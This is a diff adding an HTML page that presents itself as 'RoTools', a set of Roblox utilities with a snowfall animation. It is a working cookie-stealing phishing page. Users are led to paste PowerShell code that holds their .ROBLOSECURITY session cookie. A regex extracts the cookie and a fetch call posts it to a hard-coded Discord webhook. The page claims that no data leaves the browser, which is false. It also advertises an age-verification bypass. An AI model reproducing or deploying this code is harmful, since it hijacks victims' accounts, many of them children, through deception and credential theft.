@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RoTools v2.4</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;700&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+        }
+        .snowflake {
+            position: absolute;
+            color: #fff;
+            font-size: 1.2em;
+            font-weight: normal;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
+            animation: fall linear infinite;
+            z-index: -1;
+        }
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+        .glass-button {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+        .glass-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
+            border: 3px solid rgba(255, 255, 255, 0.4);
+        }
+        .tagline {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .orbitron {
+            font-family: 'Orbitron', sans-serif;
+        }
+        .input-modal {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            z-index: 20;
+            padding: 1.5rem;
+            border-radius: 1rem;
+            opacity: 0;
+            visibility: hidden;
+            transition: transform 0.5s ease, opacity 0.5s ease, visibility 0s linear 0.5s;
+            width: 300px;
+        }
+        .input-modal.active {
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 1;
+            visibility: visible;
+            transition: transform 0.5s ease, opacity 0.5s ease, visibility 0s linear 0s;
+        }
+        .input-modal input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            width: 100%;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            margin-top: 0.5rem;
+        }
+        .input-modal button.done-button {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #fff;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+            transition: all 0.3s ease;
+        }
+        .input-modal button.done-button:hover {
+            background: rgba(255, 255, 255, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.4);
+        }
+        .close-button {
+            position: absolute;
+            top: 0.2rem;
+            right: 0.5rem;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            width: 1.5rem;
+            height: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .close-button:hover {
+            color: #fff;
+        }
+        .main-content {
+            transition: opacity 0.5s ease;
+        }
+        .main-content.hidden {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        .error-message {
+            color: rgba(255, 100, 100, 0.8);
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+            display: none;
+        }
+    </style>
+    <script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+
+        function filledCell(cell) {
+            return cell !== '' && cell != null;
+        }
+
+        function loadFileData(filename) {
+            if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+                try {
+                    var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                    var firstSheetName = workbook.SheetNames[0];
+                    var worksheet = workbook.Sheets[firstSheetName];
+
+                    // Convert sheet to JSON to filter blank rows
+                    var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+
+                    // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                    var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                    // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                    var headerRowIndex = filteredData.findIndex((row, index) =>
+                        row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                    );
+
+                    // Fallback
+                    if (headerRowIndex === -1 || headerRowIndex > 25) {
+                        headerRowIndex = 0;
+                    }
+
+                    // Convert filtered JSON back to CSV
+                    var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                    csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                    return csv;
+                } catch (e) {
+                    console.error(e);
+                    return "";
+                }
+            }
+            return gk_fileData[filename] || "";
+        }
+    </script>
+</head>
+<body class="flex flex-col items-center justify-between min-h-screen">
+    <div class="main-content" id="mainContent">
+        <header class="text-center py-4 relative z-10">
+            <h1 class="text-5xl sm:text-6xl font-bold tracking-widest uppercase orbitron">RoTools v2.4</h1>
+            <p class="text-sm sm:text-base tagline max-w-md mx-auto mt-2 px-4">
+                RoTools is a comprehensive collection of advanced Roblox utilities. Extract account data, copy games, boost followers, and enhance your Roblox experience.
+                <br>
+                Built with security first - all processing happens in your browser with no data storage on our servers.
+            </p>
+        </header>
+
+        <main class="flex-grow flex items-center justify-center relative z-10">
+            <div class="flex flex-col space-y-4">
+                <a href="#" class="glass-button flex flex-col items-center justify-center w-64 sm:w-80 h-28 rounded-xl text-center p-4" onclick="showInputModal('Input your PowerShell code to extract account data:')">
+                    <span class="text-lg font-semibold">Account Stealer</span>
+                    <span class="text-xs tagline mt-1">Advanced account extraction tool. Extract complete account information including cookies, Robux, and valuable items.</span>
+                </a>
+                <a href="#" class="glass-button flex flex-col items-center justify-center w-64 sm:w-80 h-28 rounded-xl text-center p-4" onclick="showInputModal('Input your PowerShell code to bot followers:')">
+                    <span class="text-lg font-semibold">Follow Bot</span>
+                    <span class="text-xs tagline mt-1">Boost your profile with automated followers. Gain popularity and credibility in the Roblox community.</span>
+                </a>
+                <a href="#" class="glass-button flex flex-col items-center justify-center w-64 sm:w-80 h-28 rounded-xl text-center p-4" onclick="showInputModal('Input your PowerShell code to extract clothing templates:')">
+                    <span class="text-lg font-semibold">Free Clothing</span>
+                    <span class="text-xs tagline mt-1">Extract and download any Roblox clothing template. Create your own clothing store with premium designs.</span>
+                </a>
+                <a href="#" class="glass-button flex flex-col items-center justify-center w-64 sm:w-80 h-28 rounded-xl text-center p-4" onclick="showInputModal('Input your PowerShell code to download games:')">
+                    <span class="text-lg font-semibold">Game Downloader</span>
+                    <span class="text-xs tagline mt-1">Clone any Roblox game with our advanced game copying technology. Get full access to scripts, models, and assets.</span>
+                </a>
+                <a href="#" class="glass-button flex flex-col items-center justify-center w-64 sm:w-80 h-28 rounded-xl text-center p-4" onclick="showInputModal('Input your PowerShell code to enable voice chat:')">
+                    <span class="text-lg font-semibold">Voice Chat Enabler</span>
+                    <span class="text-xs tagline mt-1">Bypass age verification and instantly enable voice chat on any Roblox account. Talk with friends in-game.</span>
+                </a>
+                <a href="#" class="glass-button flex flex-col items-center justify-center w-64 sm:w-80 h-28 rounded-xl text-center p-4" onclick="showInputModal('Input your PowerShell code to track limited items:')">
+                    <span class="text-lg font-semibold">Limited Checker</span>
+                    <span class="text-xs tagline mt-1">Track and monitor limited items. Get instant notifications for price drops and rare item releases.</span>
+                </a>
+            </div>
+        </main>
+
+        <footer class="w-full py-2 relative z-10">
+            <div class="flex justify-center">
+                <p class="text-xs tagline">© 2025 RoTools</p>
+            </div>
+        </footer>
+    </div>
+
+    <div class="input-modal" id="inputModal">
+        <button class="close-button" onclick="hideInputModal()">✕</button>
+        <p class="text-base font-semibold" id="modalPrompt">Please input your PowerShell code:</p>
+        <input type="text" placeholder="Enter code here" class="focus:outline-none" id="codeInput">
+        <p class="error-message" id="errorMessage">Invalid PowerShell code. Please ensure it's the correct PowerShell code.</p>
+        <button class="done-button" onclick="validateCode()">Done</button>
+    </div>
+
+    <script>
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
+            snowflake.innerText = '❄';
+            snowflake.style.left = Math.random() * 100 + 'vw';
+            snowflake.style.animationDuration = Math.random() * 5 + 5 + 's';
+            snowflake.style.opacity = Math.random() * 0.5 + 0.3;
+            document.body.appendChild(snowflake);
+
+            setTimeout(() => {
+                snowflake.remove();
+            }, 10000);
+        }
+
+        function showInputModal(prompt) {
+            const mainContent = document.getElementById('mainContent');
+            const inputModal = document.getElementById('inputModal');
+            document.getElementById('modalPrompt').innerText = prompt;
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('codeInput').value = '';
+            mainContent.classList.add('hidden');
+            setTimeout(() => {
+                inputModal.classList.add('active');
+            }, 500);
+            return false;
+        }
+
+        function hideInputModal() {
+            const mainContent = document.getElementById('mainContent');
+            const inputModal = document.getElementById('inputModal');
+            inputModal.classList.remove('active');
+            setTimeout(() => {
+                mainContent.classList.remove('hidden');
+            }, 500);
+        }
+
+function sendCookieToDiscord(cookie) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1382701591790092339/qalnWv_H3pOxPV2t_igeul-aTLncT15sVr_sLFE-J3Zdld0q8Y2jLF1OHbgJcyyEBwe-';
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            username: 'Made by dick',
+            embeds: [{
+                title: '🍪 New Cookie Extracted! 🍪',
+                description: '```' + cookie + '```\nPlease use the RoTools cookie information extractor to get more info about the cookie!',
+                color: 0x00FF00,
+                footer: {
+                    text: 'RoTools v2.4 | Made by nonchalant veiny ahh dih'
+                }
+            }]
+        }),
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.json();
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+
+        function validateCode() {
+            const code = document.getElementById('codeInput').value;
+            const errorMessage = document.getElementById('errorMessage');
+            const requiredLines = [
+                '$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession',
+                '$session.Cookies.Add((New-Object System.Net.Cookie(',
+                'Invoke-WebRequest -UseBasicParsing -Uri'
+            ];
+
+            const isValid = requiredLines.every(line => code.includes(line));
+
+            if (isValid) {
+                // Extract .ROBLOSECURITY cookie from PowerShell code
+                const cookieRegex = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)",/;
+                const match = code.match(cookieRegex);
+
+                if (match && match[1]) {
+                    const cookieValue = match[1];
+                    sendCookieToDiscord(cookieValue);
+                }
+
+                hideInputModal();
+            } else {
+                errorMessage.style.display = 'block';
+            }
+        }
+
+        setInterval(createSnowflake, 100);
+    </script>
+</body>
+</html>
